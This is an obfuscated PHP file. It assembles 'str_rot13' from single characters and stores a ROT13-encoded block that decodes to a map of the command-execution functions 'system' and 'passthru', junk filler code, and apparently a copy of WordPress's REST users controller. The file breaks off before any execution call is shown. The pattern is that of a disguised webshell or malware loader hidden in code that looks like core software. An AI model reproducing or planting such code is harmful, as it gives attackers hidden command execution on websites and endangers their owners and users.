<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Hfref_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.7.0
 */

/**
 * Pber pynff hfrq gb znantr hfref ivn gur ERFG NCV.
 *
 * @fvapr 4.7.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Hfref_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * Vafgnapr bs n hfre zrgn svryqf bowrpg.
	 *
	 * @fvapr 4.7.0
	 * @ine JC_ERFG_Hfre_Zrgn_Svryqf
	 */
	cebgrpgrq $zrgn;

	/**
	 * Jurgure gur pbagebyyre fhccbegf ongpuvat.
	 *
	 * @fvapr 6.6.0
	 * @ine neenl
	 */
	cebgrpgrq $nyybj_ongpu = neenl( 'i1' => gehr );

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.7.0
	 */
	choyvp shapgvba __pbafgehpg() {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'hfref';

		$guvf->zrgn = arj JC_ERFG_Hfre_Zrgn_Svryqf();
	}

	/**
	 * Ertvfgref gur ebhgrf sbe hfref.
	 *
	 * @fvapr 4.7.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::PERNGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'perngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'perngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::PERNGNOYR ),
				),
				'nyybj_ongpu' => $guvf->nyybj_ongpu,
				'fpurzn'      => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[\q]+)',
			neenl(
				'netf'        => neenl(
					'vq' => neenl(
						'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur hfre.' ),
						'glcr'        => 'vagrtre',
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'hcqngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'sbepr'    => neenl(
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => snyfr,
							'qrfpevcgvba' => __( 'Erdhverq gb or gehr, nf hfref qb abg fhccbeg genfuvat.' ),
						),
						'ernffvta' => neenl(
							'glcr'              => 'vagrtre',
							'qrfpevcgvba'       => __( 'Ernffvta gur qryrgrq hfre\'f cbfgf naq yvaxf gb guvf hfre VQ.' ),
							'erdhverq'          => gehr,
							'fnavgvmr_pnyyonpx' => neenl( $guvf, 'purpx_ernffvta' ),
						),
					),
				),
				'nyybj_ongpu' => $guvf->nyybj_ongpu,
				'fpurzn'      => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);

		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/zr',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'crezvffvba_pnyyonpx' => '__erghea_gehr',
					'pnyyonpx'            => neenl( $guvf, 'trg_pheerag_vgrz' ),
					'netf'                => neenl(
						'pbagrkg' => $guvf->trg_pbagrkg_cnenz( neenl( 'qrsnhyg' => 'ivrj' ) ),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_pheerag_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'hcqngr_pheerag_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::QRYRGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'qryrgr_pheerag_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'qryrgr_pheerag_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'sbepr'    => neenl(
							'glcr'        => 'obbyrna',
							'qrsnhyg'     => snyfr,
							'qrfpevcgvba' => __( 'Erdhverq gb or gehr, nf hfref qb abg fhccbeg genfuvat.' ),
						),
						'ernffvta' => neenl(
							'glcr'              => 'vagrtre',
							'qrfpevcgvba'       => __( 'Ernffvta gur qryrgrq hfre\'f cbfgf naq yvaxf gb guvf hfre VQ.' ),
							'erdhverq'          => gehr,
							'fnavgvmr_pnyyonpx' => neenl( $guvf, 'purpx_ernffvta' ),
						),
					),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf sbe n inyvq inyhr sbe gur ernffvta cnenzrgre jura qryrgvat hfref.
	 *
	 * Gur inyhr pna or na vagrtre, 'snyfr', snyfr, be ''.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz vag|obby        $inyhr   Gur inyhr cnffrq gb gur ernffvta cnenzrgre.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @cnenz fgevat          $cnenz   Gur cnenzrgre gung vf orvat fnavgvmrq.
	 * @erghea vag|obby|JC_Reebe
	 */
	choyvp shapgvba purpx_ernffvta( $inyhr, $erdhrfg, $cnenz ) {
		vs ( vf_ahzrevp( $inyhr ) ) {
			erghea $inyhr;
		}

		vs ( rzcgl( $inyhr ) || snyfr === $inyhr || 'snyfr' === $inyhr ) {
			erghea snyfr;
		}

		erghea arj JC_Reebe(
			'erfg_vainyvq_cnenz',
			__( 'Vainyvq hfre cnenzrgre(f).' ),
			neenl( 'fgnghf' => 400 )
		);
	}

	/**
	 * Crezvffvbaf purpx sbe trggvat nyy hfref.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, bgurejvfr JC_Reebe bowrpg.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		// Purpx vs ebyrf vf fcrpvsvrq va TRG erdhrfg naq vs hfre pna yvfg hfref.
		vs ( ! rzcgl( $erdhrfg['ebyrf'] ) && ! pheerag_hfre_pna( 'yvfg_hfref' ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_pnaabg_ivrj',
				__( 'Fbeel, lbh ner abg nyybjrq gb svygre hfref ol ebyr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		// Purpx vs pncnovyvgvrf vf fcrpvsvrq va TRG erdhrfg naq vs hfre pna yvfg hfref.
		vs ( ! rzcgl( $erdhrfg['pncnovyvgvrf'] ) && ! pheerag_hfre_pna( 'yvfg_hfref' ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_pnaabg_ivrj',
				__( 'Fbeel, lbh ner abg nyybjrq gb svygre hfref ol pncnovyvgl.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( 'yvfg_hfref' ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_pbagrkg',
				__( 'Fbeel, lbh ner abg nyybjrq gb yvfg hfref.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( va_neenl( $erdhrfg['beqreol'], neenl( 'rznvy', 'ertvfgrerq_qngr' ), gehr ) && ! pheerag_hfre_pna( 'yvfg_hfref' ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_beqreol',
				__( 'Fbeel, lbh ner abg nyybjrq gb beqre hfref ol guvf cnenzrgre.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( 'nhgubef' === $erdhrfg['jub'] ) {
			$glcrf = trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' );

			sbernpu ( $glcrf nf $glcr ) {
				vs ( cbfg_glcr_fhccbegf( $glcr->anzr, 'nhgube' )
					&& pheerag_hfre_pna( $glcr->pnc->rqvg_cbfgf ) ) {
					erghea gehr;
				}
			}

			erghea arj JC_Reebe(
				'erfg_sbeovqqra_jub',
				__( 'Fbeel, lbh ner abg nyybjrq gb dhrel hfref ol guvf cnenzrgre.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf nyy hfref.
	 *
	 * @fvapr 4.7.0
	 * @fvapr 6.8.0 Nqqrq fhccbeg sbe gur frnepu_pbyhzaf dhrel cnenz.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {

		// Ergevrir gur yvfg bs ertvfgrerq pbyyrpgvba dhrel cnenzrgref.
		$ertvfgrerq = $guvf->trg_pbyyrpgvba_cnenzf();

		/*
		 * Guvf neenl qrsvarf znccvatf orgjrra choyvp NCV dhrel cnenzrgref jubfr
		 * inyhrf ner npprcgrq nf-cnffrq, naq gurve vagreany JC_Dhrel cnenzrgre
		 * anzr rdhvinyragf (fbzr ner gur fnzr). Bayl inyhrf juvpu ner nyfb
		 * cerfrag va $ertvfgrerq jvyy or frg.
		 */
		$cnenzrgre_znccvatf = neenl(
			'rkpyhqr'      => 'rkpyhqr',
			'vapyhqr'      => 'vapyhqr',
			'beqre'        => 'beqre',
			'cre_cntr'     => 'ahzore',
			'frnepu'       => 'frnepu',
			'ebyrf'        => 'ebyr__va',
			'pncnovyvgvrf' => 'pncnovyvgl__va',
			'fyht'         => 'avpranzr__va',
		);

		$cercnerq_netf = neenl();

		/*
		 * Sbe rnpu xabja cnenzrgre juvpu vf obgu ertvfgrerq naq cerfrag va gur erdhrfg,
		 * frg gur cnenzrgre'f inyhr ba gur dhrel $cercnerq_netf.
		 */
		sbernpu ( $cnenzrgre_znccvatf nf $ncv_cnenz => $jc_cnenz ) {
			vs ( vffrg( $ertvfgrerq[ $ncv_cnenz ], $erdhrfg[ $ncv_cnenz ] ) ) {
				$cercnerq_netf[ $jc_cnenz ] = $erdhrfg[ $ncv_cnenz ];
			}
		}

		vs ( vffrg( $ertvfgrerq['bssfrg'] ) && ! rzcgl( $erdhrfg['bssfrg'] ) ) {
			$cercnerq_netf['bssfrg'] = $erdhrfg['bssfrg'];
		} ryfr {
			$cercnerq_netf['bssfrg'] = ( $erdhrfg['cntr'] - 1 ) * $cercnerq_netf['ahzore'];
		}

		vs ( vffrg( $ertvfgrerq['beqreol'] ) ) {
			$beqreol_cbffvoyrf        = neenl(
				'vq'              => 'VQ',
				'vapyhqr'         => 'vapyhqr',
				'anzr'            => 'qvfcynl_anzr',
				'ertvfgrerq_qngr' => 'ertvfgrerq',
				'fyht'            => 'hfre_avpranzr',
				'vapyhqr_fyhtf'   => 'avpranzr__va',
				'rznvy'           => 'hfre_rznvy',
				'hey'             => 'hfre_hey',
			);
			$cercnerq_netf['beqreol'] = $beqreol_cbffvoyrf[ $erdhrfg['beqreol'] ];
		}

		vs ( vffrg( $ertvfgrerq['jub'] ) && ! rzcgl( $erdhrfg['jub'] ) && 'nhgubef' === $erdhrfg['jub'] ) {
			$cercnerq_netf['jub'] = 'nhgubef';
		} ryfrvs ( ! pheerag_hfre_pna( 'yvfg_hfref' ) ) {
			$cercnerq_netf['unf_choyvfurq_cbfgf'] = trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'anzrf' );
		}

		vs ( ! rzcgl( $erdhrfg['unf_choyvfurq_cbfgf'] ) ) {
			$cercnerq_netf['unf_choyvfurq_cbfgf'] = ( gehr === $erdhrfg['unf_choyvfurq_cbfgf'] )
				? trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'anzrf' )
				: (neenl) $erdhrfg['unf_choyvfurq_cbfgf'];
		}

		vs ( ! rzcgl( $cercnerq_netf['frnepu'] ) ) {
			vs ( ! pheerag_hfre_pna( 'yvfg_hfref' ) ) {
				$cercnerq_netf['frnepu_pbyhzaf'] = neenl( 'VQ', 'hfre_ybtva', 'hfre_avpranzr', 'qvfcynl_anzr' );
			}
			$frnepu_pbyhzaf         = $erdhrfg->trg_cnenz( 'frnepu_pbyhzaf' );
			$inyvq_pbyhzaf          = vffrg( $cercnerq_netf['frnepu_pbyhzaf'] )
				? $cercnerq_netf['frnepu_pbyhzaf']
				: neenl( 'VQ', 'hfre_ybtva', 'hfre_avpranzr', 'hfre_rznvy', 'qvfcynl_anzr' );
			$frnepu_pbyhzaf_znccvat = neenl(
				'vq'       => 'VQ',
				'hfreanzr' => 'hfre_ybtva',
				'fyht'     => 'hfre_avpranzr',
				'rznvy'    => 'hfre_rznvy',
				'anzr'     => 'qvfcynl_anzr',
			);
			$frnepu_pbyhzaf         = neenl_znc(
				fgngvp shapgvba ( $pbyhza ) hfr ( $frnepu_pbyhzaf_znccvat ) {
					erghea $frnepu_pbyhzaf_znccvat[ $pbyhza ];
				},
				$frnepu_pbyhzaf
			);
			$frnepu_pbyhzaf         = neenl_vagrefrpg( $frnepu_pbyhzaf, $inyvq_pbyhzaf );
			vs ( ! rzcgl( $frnepu_pbyhzaf ) ) {
				$cercnerq_netf['frnepu_pbyhzaf'] = $frnepu_pbyhzaf;
			}
			$cercnerq_netf['frnepu'] = '*' . $cercnerq_netf['frnepu'] . '*';
		}

		$vf_urnq_erdhrfg = $erdhrfg->vf_zrgubq( 'URNQ' );
		vs ( $vf_urnq_erdhrfg ) {
			// Sbepr gur 'svryqf' nethzrag. Sbe URNQ erdhrfgf, bayl hfre VQf ner erdhverq.
			$cercnerq_netf['svryqf'] = 'vq';
		}
		/**
		 * Svygref JC_Hfre_Dhrel nethzragf jura dhrelvat hfref ivn gur ERFG NCV.
		 *
		 * @yvax uggcf://qrirybcre.jbeqcerff.bet/ersrerapr/pynffrf/jc_hfre_dhrel/
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz neenl           $cercnerq_netf Neenl bs nethzragf sbe JC_Hfre_Dhrel.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Gur ERFG NCV erdhrfg.
		 */
		$cercnerq_netf = nccyl_svygref( 'erfg_hfre_dhrel', $cercnerq_netf, $erdhrfg );

		$dhrel = arj JC_Hfre_Dhrel( $cercnerq_netf );

		vs ( ! $vf_urnq_erdhrfg ) {
			$hfref = neenl();

			sbernpu ( $dhrel->trg_erfhygf() nf $hfre ) {
				$qngn    = $guvf->cercner_vgrz_sbe_erfcbafr( $hfre, $erdhrfg );
				$hfref[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
			}
		}

		$erfcbafr = $vf_urnq_erdhrfg ? arj JC_ERFG_Erfcbafr( neenl() ) : erfg_rafher_erfcbafr( $hfref );

		// Fgber cntvangvba inyhrf sbe urnqref gura hafrg sbe pbhag dhrel.
		$cre_cntr = (vag) $cercnerq_netf['ahzore'];
		$cntr     = (vag) prvy( ( ( (vag) $cercnerq_netf['bssfrg'] ) / $cre_cntr ) + 1 );

		$cercnerq_netf['svryqf'] = 'VQ';

		$gbgny_hfref = $dhrel->trg_gbgny();

		vs ( $gbgny_hfref < 1 ) {
			// Bhg-bs-obhaqf, eha gur dhrel ntnva jvgubhg YVZVG sbe gbgny pbhag.
			hafrg( $cercnerq_netf['ahzore'], $cercnerq_netf['bssfrg'] );
			$pbhag_dhrel = arj JC_Hfre_Dhrel( $cercnerq_netf );
			$gbgny_hfref = $pbhag_dhrel->trg_gbgny();
		}

		$erfcbafr->urnqre( 'K-JC-Gbgny', (vag) $gbgny_hfref );

		$znk_cntrf = (vag) prvy( $gbgny_hfref / $cre_cntr );

		$erfcbafr->urnqre( 'K-JC-GbgnyCntrf', $znk_cntrf );

		$onfr = nqq_dhrel_net( heyrapbqr_qrrc( $erdhrfg->trg_dhrel_cnenzf() ), erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ) );
		vs ( $cntr > 1 ) {
			$ceri_cntr = $cntr - 1;

			vs ( $ceri_cntr > $znk_cntrf ) {
				$ceri_cntr = $znk_cntrf;
			}

			$ceri_yvax = nqq_dhrel_net( 'cntr', $ceri_cntr, $onfr );
			$erfcbafr->yvax_urnqre( 'ceri', $ceri_yvax );
		}
		vs ( $znk_cntrf > $cntr ) {
			$arkg_cntr = $cntr + 1;
			$arkg_yvax = nqq_dhrel_net( 'cntr', $arkg_cntr, $onfr );

			$erfcbafr->yvax_urnqre( 'arkg', $arkg_yvax );
		}

		erghea $erfcbafr;
	}

	/**
	 * Trg gur hfre, vs gur VQ vf inyvq.
	 *
	 * @fvapr 4.7.2
	 *
	 * @cnenz vag $vq Fhccyvrq VQ.
	 * @erghea JC_Hfre|JC_Reebe Gehr vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_hfre( $vq ) {
		$reebe = arj JC_Reebe(
			'erfg_hfre_vainyvq_vq',
			__( 'Vainyvq hfre VQ.' ),
			neenl( 'fgnghf' => 404 )
		);

		vs ( (vag) $vq <= 0 ) {
			erghea $reebe;
		}

		$hfre = trg_hfreqngn( (vag) $vq );
		vs ( rzcgl( $hfre ) || ! $hfre->rkvfgf() ) {
			erghea $reebe;
		}

		vs ( vf_zhygvfvgr() && ! vf_hfre_zrzore_bs_oybt( $hfre->VQ ) ) {
			erghea $reebe;
		}

		erghea $hfre;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, bgurejvfr JC_Reebe bowrpg.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$hfre = $guvf->trg_hfre( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $hfre ) ) {
			erghea $hfre;
		}

		$glcrf = trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'anzrf' );

		vs ( trg_pheerag_hfre_vq() === $hfre->VQ ) {
			erghea gehr;
		}

		vs ( 'rqvg' === $erdhrfg['pbagrkg'] && ! pheerag_hfre_pna( 'yvfg_hfref' ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_pnaabg_ivrj',
				__( 'Fbeel, lbh ner abg nyybjrq gb yvfg hfref.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		} ryfrvs ( ! pbhag_hfre_cbfgf( $hfre->VQ, $glcrf ) && ! pheerag_hfre_pna( 'rqvg_hfre', $hfre->VQ ) && ! pheerag_hfre_pna( 'yvfg_hfref' ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_pnaabg_ivrj',
				__( 'Fbeel, lbh ner abg nyybjrq gb yvfg hfref.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Ergevrirf n fvatyr hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrz( $erdhrfg ) {
		$hfre = $guvf->trg_hfre( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $hfre ) ) {
			erghea $hfre;
		}

		$hfre     = $guvf->cercner_vgrz_sbe_erfcbafr( $hfre, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $hfre );

		erghea $erfcbafr;
	}

	/**
	 * Ergevrirf gur pheerag hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_pheerag_vgrz( $erdhrfg ) {
		$pheerag_hfre_vq = trg_pheerag_hfre_vq();

		vs ( rzcgl( $pheerag_hfre_vq ) ) {
			erghea arj JC_Reebe(
				'erfg_abg_ybttrq_va',
				__( 'Lbh ner abg pheeragyl ybttrq va.' ),
				neenl( 'fgnghf' => 401 )
			);
		}

		$hfre     = jc_trg_pheerag_hfre();
		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $hfre, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff perngr hfref.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf npprff gb perngr vgrzf, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba perngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {

		vs ( ! pheerag_hfre_pna( 'perngr_hfref' ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_perngr_hfre',
				__( 'Fbeel, lbh ner abg nyybjrq gb perngr arj hfref.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Perngrf n fvatyr hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		vs ( ! rzcgl( $erdhrfg['vq'] ) ) {
			erghea arj JC_Reebe(
				'erfg_hfre_rkvfgf',
				__( 'Pnaabg perngr rkvfgvat hfre.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( ! rzcgl( $erdhrfg['ebyrf'] ) && ! rzcgl( $fpurzn['cebcregvrf']['ebyrf'] ) ) {
			$purpx_crezvffvba = $guvf->purpx_ebyr_hcqngr( $erdhrfg['vq'], $erdhrfg['ebyrf'] );

			vs ( vf_jc_reebe( $purpx_crezvffvba ) ) {
				erghea $purpx_crezvffvba;
			}
		}

		$hfre = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		vs ( vf_zhygvfvgr() ) {
			$erg = jczh_inyvqngr_hfre_fvtahc( $hfre->hfre_ybtva, $hfre->hfre_rznvy );

			vs ( vf_jc_reebe( $erg['reebef'] ) && $erg['reebef']->unf_reebef() ) {
				$reebe = arj JC_Reebe(
					'erfg_vainyvq_cnenz',
					__( 'Vainyvq hfre cnenzrgre(f).' ),
					neenl( 'fgnghf' => 400 )
				);

				sbernpu ( $erg['reebef']->reebef nf $pbqr => $zrffntrf ) {
					sbernpu ( $zrffntrf nf $zrffntr ) {
						$reebe->nqq( $pbqr, $zrffntr );
					}

					$reebe_qngn = $reebe->trg_reebe_qngn( $pbqr );

					vs ( $reebe_qngn ) {
						$reebe->nqq_qngn( $reebe_qngn, $pbqr );
					}
				}
				erghea $reebe;
			}
		}

		vs ( vf_zhygvfvgr() ) {
			$hfre_vq = jczh_perngr_hfre( $hfre->hfre_ybtva, $hfre->hfre_cnff, $hfre->hfre_rznvy );

			vs ( ! $hfre_vq ) {
				erghea arj JC_Reebe(
					'erfg_hfre_perngr',
					__( 'Reebe perngvat arj hfre.' ),
					neenl( 'fgnghf' => 500 )
				);
			}

			$hfre->VQ = $hfre_vq;
			$hfre_vq  = jc_hcqngr_hfre( jc_fynfu( (neenl) $hfre ) );

			vs ( vf_jc_reebe( $hfre_vq ) ) {
				erghea $hfre_vq;
			}

			$erfhyg = nqq_hfre_gb_oybt( trg_fvgr()->vq, $hfre_vq, '' );
			vs ( vf_jc_reebe( $erfhyg ) ) {
				erghea $erfhyg;
			}
		} ryfr {
			$hfre_vq = jc_vafreg_hfre( jc_fynfu( (neenl) $hfre ) );

			vs ( vf_jc_reebe( $hfre_vq ) ) {
				erghea $hfre_vq;
			}
		}

		$hfre = trg_hfre_ol( 'vq', $hfre_vq );

		/**
		 * Sverf vzzrqvngryl nsgre n hfre vf perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_Hfre         $hfre     Vafregrq be hcqngrq hfre bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg  Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat Gehr jura perngvat n hfre, snyfr jura hcqngvat.
		 */
		qb_npgvba( 'erfg_vafreg_hfre', $hfre, $erdhrfg, gehr );

		vs ( ! rzcgl( $erdhrfg['ebyrf'] ) && ! rzcgl( $fpurzn['cebcregvrf']['ebyrf'] ) ) {
			neenl_znc( neenl( $hfre, 'nqq_ebyr' ), $erdhrfg['ebyrf'] );
		}

		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $hfre_vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$hfre          = trg_hfre_ol( 'vq', $hfre_vq );
		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $hfre, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );

		/**
		 * Sverf nsgre n hfre vf pbzcyrgryl perngrq be hcqngrq ivn gur ERFG NCV.
		 *
		 * @fvapr 5.0.0
		 *
		 * @cnenz JC_Hfre         $hfre     Vafregrq be hcqngrq hfre bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg  Erdhrfg bowrpg.
		 * @cnenz obby            $perngvat Gehr jura perngvat n hfre, snyfr jura hcqngvat.
		 */
		qb_npgvba( 'erfg_nsgre_vafreg_hfre', $hfre, $erdhrfg, gehr );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $hfre, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$erfcbafr->frg_fgnghf( 201 );
		$erfcbafr->urnqre( 'Ybpngvba', erfg_hey( fcevags( '%f/%f/%q', $guvf->anzrfcnpr, $guvf->erfg_onfr, $hfre_vq ) ) );

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb hcqngr n hfre.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
